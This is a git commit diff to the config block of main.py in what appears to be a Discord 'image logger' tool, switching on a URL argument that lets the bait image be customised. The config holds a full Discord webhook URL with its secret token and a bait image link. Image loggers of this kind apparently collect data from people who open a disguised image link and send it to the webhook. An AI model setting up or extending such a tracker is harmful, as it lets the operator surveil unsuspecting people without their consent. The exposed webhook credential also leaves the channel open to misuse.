ce0cc65916e4eea6cd85a9170ac50f2fce0884e1
de4uth <114942587+ha2ked@users.noreply.github.com>
2024-08-18 18:38:48 +0100

    Update main.py

--- main.py
+++ main.py
@@ -15,7 +15,7 @@ config = {
     "webhook": "https://canary.discord.com/api/webhooks/1270799712802308288/MgzcDY0mI3MEcKddq5PdgtlcF5iU304zPr5ZQE1UqpLxPdD62Su5mgNHAVU68EMYTDh6",
     "image": "https://i.ibb.co/c3mc1jw/17-Uillinn-2.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "hehe", # Set this to the name you want the webhook to have
